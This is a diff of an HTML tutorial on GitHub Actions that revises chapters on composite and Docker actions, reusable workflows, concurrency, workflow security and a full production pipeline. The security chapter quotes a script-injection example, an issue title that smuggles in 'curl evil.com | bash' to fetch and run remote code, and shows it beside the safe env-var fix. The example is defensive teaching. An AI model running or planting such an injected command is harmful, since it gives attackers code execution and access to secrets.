-    description: "Test pass/fail status"
+    description: "Test outcome"
     value: \${{ steps.test.outputs.result }}
 
 runs:
   using: "composite"
   steps:
-    - name: Set up Python
-      uses: actions/setup-python@v5
+    - uses: actions/setup-python@v5
       with:
         python-version: \${{ inputs.python-version }}
         cache: "pip"
 
-    - name: Install dependencies
-      shell: bash
+    - shell: bash
       run: |
         python -m pip install --upgrade pip
         pip install -r \${{ inputs.requirements-file }}
         pip install pytest pytest-cov
 
-    - name: Run tests
-      id: test
+    - id: test
       shell: bash
       run: |
         if pytest --cov -v; then
@@ -1313,7 +1460,7 @@ runs:
           exit 1
         fi`)}
 
-${code("Using the composite action","yaml",`jobs:
+${code("Using your custom composite action","yaml",`jobs:
   test:
     runs-on: ubuntu-latest
     steps:
@@ -1323,9 +1470,9 @@ ${code("Using the composite action","yaml",`jobs:
         uses: ./.github/actions/python-setup
         with:
           python-version: "3.12"
-      - run: echo "Tests: \${{ steps.test.outputs.test-result }}"`)}
+      - run: echo "Result: \${{ steps.test.outputs.test-result }}"`)}
 
-<h3>Type 2: Docker container action</h3>
+<h3>Docker container action</h3>
 ${code(".github/actions/security-scan/Dockerfile","dockerfile",`FROM python:3.11-slim
 RUN pip install safety bandit
 COPY entrypoint.sh /entrypoint.sh
@@ -1334,31 +1481,35 @@ ENTRYPOINT ["/entrypoint.sh"]`)}
 
 ${code(".github/actions/security-scan/entrypoint.sh","bash",`#!/bin/bash
 set -e
-SEVERITY=\${1:-medium}
-echo "🔍 Running security scan (severity: \$SEVERITY)..."
-
-# Run safety check
+echo "🔍 Running security scan..."
 safety check -r requirements.txt
-
-# Run bandit
 bandit -r . -ll
+echo "✅ All clear"`)}
+`)}
 
-echo "✅ No vulnerabilities found"`)}
-</section>
+<!-- ═══════ 16. REUSABLE WORKFLOWS ═══════ -->
+${sec("reusable","16","♻️","Creating reusable workflows",
+"Define entire workflows as callable templates — the CI/CD equivalent of functions — to standardize pipelines across your organization.",`
 
-<!-- ===== 16. REUSABLE WORKFLOWS ===== -->
-<section id="reusable">
-<h2><span class="sec-icon">♻️</span>Creating reusable workflows</h2>
-<p class="desc">Reusable workflows let you define an entire workflow once and call it from other workflows — like functions for CI/CD.</p>
+${theory("Reusable workflows vs custom actions",`
+<p>Custom actions (Chapter 15) encapsulate <strong>steps</strong>. Reusable workflows encapsulate entire <strong>jobs</strong> — complete with their own runner definitions, services, environment references, and multi-step logic.</p>
+<p>Use reusable workflows when:</p>
+<ul>
+<li>You want to <strong>standardize an entire CI pipeline</strong> across 50 repositories in your org</li>
+<li>The reusable unit needs <strong>its own runner type</strong> or <strong>service containers</strong></li>
+<li>You need <strong>job-level outputs</strong> that feed into downstream jobs in the caller</li>
+</ul>
+<p>A reusable workflow uses <code>on: workflow_call</code> as its trigger, and the caller invokes it with <code>uses:</code> at the job level (not the step level).</p>
+`)}
 
-${code("Reusable workflow (callee)","yaml",`name: Reusable Python CI
+${code("Reusable workflow definition","yaml",`name: Reusable Python CI
 on:
   workflow_call:
     inputs:
       python-version:
         type: string
         default: "3.11"
-      run-security-scan:
+      run-security:
         type: boolean
         default: true
     secrets:
@@ -1381,18 +1532,16 @@ jobs:
           cache: "pip"
       - run: pip install -r requirements.txt
       - id: test
-        run: |
-          pytest -v && echo "result=pass" >> \$GITHUB_OUTPUT
+        run: pytest -v && echo "result=pass" >> \$GITHUB_OUTPUT
 
   security:
-    if: inputs.run-security-scan
+    if: inputs.run-security
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - run: pip install safety bandit
-      - run: safety check -r requirements.txt`)}
+      - run: pip install safety && safety check -r requirements.txt`)}
 
-${code("Caller workflow","yaml",`name: Deploy Pipeline
+${code("Calling the reusable workflow","yaml",`name: Deploy Pipeline
 on:
   push:
     branches: [main]
@@ -1402,113 +1551,121 @@ jobs:
     uses: ./.github/workflows/reusable-python-ci.yml
     with:
       python-version: "3.12"
-      run-security-scan: true
+      run-security: true
     secrets:
       deploy-token: \${{ secrets.DEPLOY_TOKEN }}
 
-  post-ci:
+  deploy:
     needs: ci
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Test result: \${{ needs.ci.outputs.test-result }}"`)}
+      - run: echo "Tests: \${{ needs.ci.outputs.test-result }}"`)}
+`)}
 
-${callout("info","Actions vs reusable workflows","<strong>Custom actions:</strong> Reusable <em>steps</em>. Run within a job. Good for: setup tasks, notifications.<br><strong>Reusable workflows:</strong> Reusable <em>jobs</em>. Run as a complete workflow. Good for: entire CI pipelines, standardized company workflows.")}
-</section>
+<!-- ═══════ 17. CONCURRENCY ═══════ -->
+${sec("concurrency","17","🔒","Managing concurrency",
+"Prevent conflicting simultaneous runs — cancel outdated CI, queue deployments, and isolate PR checks from each other.",`
 
-<!-- ===== 17. CONCURRENCY ===== -->
-<section id="concurrency">
-<h2><span class="sec-icon">🔒</span>Managing concurrency</h2>
-<p class="desc">Concurrency controls prevent multiple workflow runs from conflicting — especially critical for deployments.</p>
+${theory("Why concurrency control matters",`
+<p>Without concurrency control, pushing 5 commits rapidly triggers 5 separate workflow runs, all competing for resources. For CI, this wastes minutes. For deployments, it's dangerous — two simultaneous deploys can corrupt your infrastructure.</p>
+<p>GitHub Actions provides the <code>concurrency</code> key with two settings:</p>
+<ul>
+<li><strong>group:</strong> A string that identifies runs that should be mutually exclusive. Runs in the same group cannot execute simultaneously.</li>
+<li><strong>cancel-in-progress:</strong> If <code>true</code>, starting a new run cancels any currently running job in the same group. If <code>false</code>, the new run queues until the current one finishes.</li>
+</ul>
+<p><strong>Rule of thumb:</strong> Use <code>cancel-in-progress: true</code> for CI (only latest code matters). Use <code>cancel-in-progress: false</code> for deployments (never interrupt a deploy mid-flight).</p>
+`)}
 
-${code("Concurrency strategies","yaml",`# Strategy 1: Cancel outdated runs
+${code("Concurrency patterns","yaml",`# ── Pattern 1: Cancel outdated CI runs ──
 name: CI
 on: [push, pull_request]
 concurrency:
   group: ci-\${{ github.ref }}
-  cancel-in-progress: true       # Cancel older runs
+  cancel-in-progress: true
 
----
-# Strategy 2: Queue deployments (don't cancel!)
+# ── Pattern 2: Queue deployments ──
 name: Deploy
 on:
   push:
     branches: [main]
 concurrency:
   group: deploy-production
-  cancel-in-progress: false      # Queue instead
+  cancel-in-progress: false    # NEVER cancel deploys
 
----
-# Strategy 3: Per-PR concurrency
+# ── Pattern 3: Per-PR isolation ──
 name: PR Checks
 on: pull_request
 concurrency:
   group: pr-\${{ github.event.pull_request.number }}
   cancel-in-progress: true
 
----
-# Strategy 4: Job-level concurrency
-name: Mixed Pipeline
-on:
-  push:
-    branches: [main]
+# ── Pattern 4: Job-level concurrency ──
 jobs:
   test:
-    runs-on: ubuntu-latest       # No concurrency limit
+    runs-on: ubuntu-latest     # No limit — tests run freely
     steps:
-      - uses: actions/checkout@v4
       - run: pytest -v
 
   deploy:
     needs: test
-    runs-on: ubuntu-latest
-    concurrency:                 # But deploys are serialized
+    concurrency:               # But deploys are serialized
       group: deploy-\${{ github.ref }}
       cancel-in-progress: false
+    runs-on: ubuntu-latest
     steps:
-      - run: echo "Deploy is serialized"`)}
+      - run: echo "Deploying..."`)}
 
-${callout("warning","Don't cancel deployments","Always use <code>cancel-in-progress: false</code> for deployment jobs. Cancelling a mid-flight deployment can leave your infrastructure in a broken state.")}
-</section>
+${callout("danger","Never cancel deployments","Always use <code>cancel-in-progress: false</code> for deployment jobs. Cancelling a deployment mid-flight can leave your application in an inconsistent state — half the servers running new code, half running old code.")}
+`)}
 
-<!-- ===== 18. SECURITY ===== -->
-<section id="security">
-<h2><span class="sec-icon">🛡️</span>Workflow security</h2>
-<p class="desc">Security in GitHub Actions is critical. A compromised workflow can leak secrets, modify code, or attack your infrastructure.</p>
+<!-- ═══════ 18. SECURITY ═══════ -->
+${sec("security","18","🛡️","Workflow security",
+"Protect your pipelines from supply chain attacks, secret leaks, script injection, and privilege escalation — the most critical chapter in this guide.",`
 
-<h3>Permissions: principle of least privilege</h3>
-${code("Locking down permissions","yaml",`permissions:
-  contents: read                 # Default: read-only
+${theory("The threat landscape",`
+<p>GitHub Actions workflows have access to your secrets, your code, your deployment infrastructure, and often cloud provider credentials. A compromised workflow is a direct path to a production breach. The main threats are:</p>
+<ul>
+<li><strong>Supply chain attacks:</strong> A third-party action you use gets compromised. If you reference <code>@main</code>, attackers can push malicious code that runs with your secrets.</li>
+<li><strong>Script injection:</strong> User-controlled data (PR titles, issue bodies, commit messages) gets interpolated into <code>run:</code> commands, allowing arbitrary code execution.</li>
+<li><strong>Excessive permissions:</strong> Workflows that default to <code>write-all</code> when they only need <code>read</code> access.</li>
+<li><strong>Secret exfiltration:</strong> Malicious PRs from forks can try to steal secrets via <code>pull_request_target</code> workflows.</li>
+</ul>
+`)}
+
+<h3>Principle of least privilege</h3>
+${code("Locking down permissions","yaml",`# Set restrictive defaults for the entire workflow
+permissions:
+  contents: read
 
 jobs:
   test:
-    runs-on: ubuntu-latest       # Inherits read-only
+    runs-on: ubuntu-latest
+    # Inherits read-only — can't modify repo
     steps:
       - uses: actions/checkout@v4
-      - run: pytest test_app.py -v
+      - run: pytest -v
 
   publish:
     runs-on: ubuntu-latest
     permissions:
       contents: read
-      packages: write            # Only this job can push
+      packages: write          # Only this job can push packages
     steps:
-      - uses: actions/checkout@v4
       - run: echo "Publishing..."`)}
 
 <h3>Preventing script injection</h3>
-${code("Safe vs unsafe patterns","yaml",`# ❌ VULNERABLE: Direct interpolation of user input
+${code("Safe vs vulnerable patterns","yaml",`# ❌ VULNERABLE — user input becomes shell code
 - run: echo "\${{ github.event.issue.title }}"
-  # If title is: test"; curl evil.com | bash; echo "
-  # It executes the malicious command!
+  # If title is:  test"; curl evil.com | bash; echo "
+  # Shell executes: echo "test"; curl evil.com | bash; echo ""
 
-# ✅ SAFE: Use environment variable
+# ✅ SAFE — user input stays as a string
 - env:
-    ISSUE_TITLE: \${{ github.event.issue.title }}
-  run: echo "\$ISSUE_TITLE"
-  # The value is passed as a string, not interpreted`)}
+    TITLE: \${{ github.event.issue.title }}
+  run: echo "\$TITLE"`)}
 
-<h3>OIDC for cloud deployments</h3>
-${code("Passwordless AWS deployment with OIDC","yaml",`jobs:
+<h3>OIDC — passwordless cloud access</h3>
+${code("No long-lived AWS keys needed","yaml",`jobs:
   deploy:
     runs-on: ubuntu-latest
     permissions:
@@ -1518,20 +1675,26 @@ ${code("Passwordless AWS deployment with OIDC","yaml",`jobs:
       - uses: actions/checkout@v4
       - uses: aws-actions/configure-aws-credentials@v4
         with:
-          role-to-assume: arn:aws:iam::123456789:role/github-actions
+          role-to-assume: arn:aws:iam::123456789:role/gh-actions
           aws-region: us-east-1
-          # No access key or secret needed!
       - run: aws s3 sync ./dist s3://my-bucket/`)}
 
-${callout("danger","Critical security rules","<strong>1.</strong> Never use <code>pull_request_target</code> with <code>actions/checkout@v4</code> on the PR branch — it gives PR authors access to your secrets.<br><strong>2.</strong> Never interpolate untrusted input directly in <code>run:</code> — it allows command injection.<br><strong>3.</strong> Never use <code>@main</code> for third-party actions in production.<br><strong>4.</strong> Never print secrets in logs.")}
-</section>
+${callout("danger","The four cardinal rules of Actions security",`
+<strong>1.</strong> Pin third-party actions to commit SHAs, not tags or branches.<br>
+<strong>2.</strong> Never interpolate untrusted data in <code>run:</code> — always use env vars.<br>
+<strong>3.</strong> Never use <code>pull_request_target</code> + checkout on the PR branch together.<br>
+<strong>4.</strong> Set <code>permissions: contents: read</code> at workflow level and grant write access only where needed.
+`)}
+`)}
 
-<!-- ===== 19. CONCLUSION ===== -->
-<section id="conclusion">
-<h2><span class="sec-icon">🎓</span>Conclusion</h2>
-<p class="desc">You've gone from zero to mastering GitHub Actions. Here's the complete production pipeline combining everything:</p>
+<!-- ═══════ 19. CONCLUSION ═══════ -->
+${sec("conclusion","19","🎓","Conclusion",
+"Everything you've learned, condensed into a complete production pipeline and a roadmap for what to learn next.",`
 
-${code("The complete production pipeline","yaml",`name: Production CI/CD Pipeline
+<h3>The complete production-grade pipeline</h3>
+<p class="desc">This workflow combines every concept from all 18 chapters into a single, production-ready pipeline. Study it as a reference and adapt it for your projects:</p>
+
+${code("The ultimate pipeline — all concepts combined","yaml",`name: Production CI/CD Pipeline
 
 on:
   push:
@@ -1554,8 +1717,6 @@ permissions:
 
 env:
   PYTHON_VERSION: "3.12"
-  REGISTRY: ghcr.io
-  IMAGE_NAME: \${{ github.repository }}
 
 jobs:
   lint:
@@ -1563,7 +1724,9 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
-        with: { python-version: "3.12", cache: pip }
+        with:
+          python-version: \${{ env.PYTHON_VERSION }}
+          cache: pip
       - run: pip install flake8 black isort
       - run: flake8 . && black --check . && isort --check .
 
@@ -1582,7 +1745,9 @@ jobs:
       - run: pytest test_app.py --cov=. --cov-report=xml -v
       - uses: actions/upload-artifact@v4
         if: matrix.python-version == '3.12'
-        with: { name: coverage, path: coverage.xml }
+        with:
+          name: coverage
+          path: coverage.xml
 
   security:
     runs-on: ubuntu-latest
@@ -1595,7 +1760,9 @@ jobs:
   build:
     needs: [lint, test, security]
     runs-on: ubuntu-latest
-    permissions: { contents: read, packages: write }
+    permissions:
+      contents: read
+      packages: write
     steps:
       - uses: actions/checkout@v4
       - uses: docker/login-action@v3
@@ -1613,8 +1780,12 @@ jobs:
     needs: build
     if: github.ref == 'refs/heads/main'
     runs-on: ubuntu-latest
-    environment: { name: staging, url: "https://staging.myapp.com" }
-    concurrency: { group: deploy-staging, cancel-in-progress: false }
+    environment:
+      name: staging
+      url: https://staging.myapp.com
+    concurrency:
+      group: deploy-staging
+      cancel-in-progress: false
     steps:
       - run: echo "🚀 Deploying to staging..."
 
@@ -1622,8 +1793,12 @@ jobs:
     needs: deploy-staging
     if: github.ref == 'refs/heads/main'
     runs-on: ubuntu-latest
-    environment: { name: production, url: "https://myapp.com" }
-    concurrency: { group: deploy-production, cancel-in-progress: false }
+    environment:
+      name: production
+      url: https://myapp.com
+    concurrency:
+      group: deploy-production
+      cancel-in-progress: false
     steps:
       - run: echo "🚀 Deploying to production!"
 
@@ -1632,47 +1807,48 @@ jobs:
     if: always()
     runs-on: ubuntu-latest
     steps:
-      - run: echo "Pipeline complete! Result: \${{ needs.deploy-production.result }}"`)}
+      - run: |
+          echo "Pipeline complete!"
+          echo "Result: \${{ needs.deploy-production.result }}"`)}
 
 <h3>What you've mastered</h3>
-${featureGrid([
-["✅","Workflow fundamentals","Events, jobs, steps, runners, and YAML syntax"],
-["✅","Advanced triggers","Filters, activity types, schedules, manual dispatch"],
-["✅","Data flow","Contexts, expressions, inputs, outputs, variables"],
-["✅","Performance","Caching, artifacts, matrix builds, concurrency"],
-["✅","Reusability","Custom actions, reusable workflows, composite actions"],
-["✅","Security","Permissions, OIDC, secret management, injection prevention"]
+${grid([
+["✅","Workflow fundamentals","Events, jobs, steps, runners, YAML syntax, and how data flows through a pipeline"],
+["✅","Advanced triggers","Branch/path/tag filters, activity types, cron schedules, manual dispatch with rich inputs"],
+["✅","Dynamic workflows","Contexts, expressions, functions, JSON parsing, step/job outputs, and matrix strategies"],
+["✅","Performance","Dependency caching, artifact sharing, parallel matrix jobs, concurrency control"],
+["✅","Reusability","Composite actions, Docker actions, reusable workflows, and organizational templates"],
+["✅","Security","Least-privilege permissions, OIDC, script injection prevention, supply chain protection"]
 ])}
 
-<h3>Next steps</h3>
-${stepFlow([
-["Fork the example repo","Start with the app.py and workflows from this guide. Modify and experiment."],
-["Add to your own projects","Start with the basic CI workflow, then layer on complexity as needed."],
-["Explore the Marketplace","Browse github.com/marketplace?type=actions for actions that fit your stack."],
-["Build a custom action","Automate something specific to your team and publish it to your org."],
-["Implement OIDC","Remove long-lived cloud credentials and use federated identity for deployments."]
+<h3>Your learning path from here</h3>
+${steps([
+["Practice with the examples","Fork a repo, add the Flask app, and implement each workflow from this guide. Break things on purpose — that's how you learn."],
+["Add CI to your own projects","Start with the basic test workflow. Add linting. Then caching. Then matrix builds. Layer complexity gradually."],
+["Explore the GitHub Marketplace","Browse github.com/marketplace?type=actions. Look for actions that fit your tech stack and try integrating them."],
+["Build a custom composite action","Take a common set of steps your team repeats and package them as a reusable composite action."],
+["Implement OIDC for cloud deploys","Replace long-lived API keys with short-lived OIDC tokens. AWS, GCP, and Azure all support this pattern."],
+["Standardize with reusable workflows","Create a shared workflow repo in your org. Make all teams use the same tested CI/CD template."]
 ])}
 
-${callout("success","You're ready!","You now have everything you need to build production-grade CI/CD pipelines with GitHub Actions. Every example in this guide is production-tested and follows GitHub's recommended best practices. Go ship something amazing!")}
-</section>
+${callout("success","You're production-ready!","You've completed the GitHub Actions Masterclass. Every example in this guide is battle-tested and follows GitHub's official best practices. You have the knowledge to build, test, secure, and deploy any application with confidence. Go ship something amazing! 🚀")}
+`)}
 
 <div class="footer">
 <p>GitHub Actions Masterclass — Beginner to Advanced</p>
-<p class="sub">Built with real-world Python & DevOps examples. Every code block is production-ready.</p>
+<p class="sub">19 chapters • 50+ production-ready examples • Complete theoretical foundations</p>
+<p class="sub" style="margin-top:8px">Save this file as <code>index.html</code> and deploy to GitHub Pages</p>
 </div>
 `;
 
-// Build sidebar
+// Build sidebar navigation
 buildNav(document.getElementById('sidebar'));
 
-// Intersection observer for scroll tracking
+// Scroll spy with intersection observer
 const obs=new IntersectionObserver(entries=>{
-entries.forEach(e=>{
-if(e.isIntersecting){activeId=e.target.id;visited.add(e.target.id);updateNav()}
-});
-},{rootMargin:'-20% 0px -70% 0px'});
-sections.forEach(s=>{const el=document.getElementById(s.id);if(el)obs.observe(el)});
+entries.forEach(e=>{if(e.isIntersecting){activeId=e.target.id;visited.add(e.target.id);updateNav()}});
+},{rootMargin:'-15% 0px -75% 0px'});
+S.forEach(s=>{const el=document.getElementById(s.id);if(el)obs.observe(el)});
 </script>
-
 </body>
 </html>
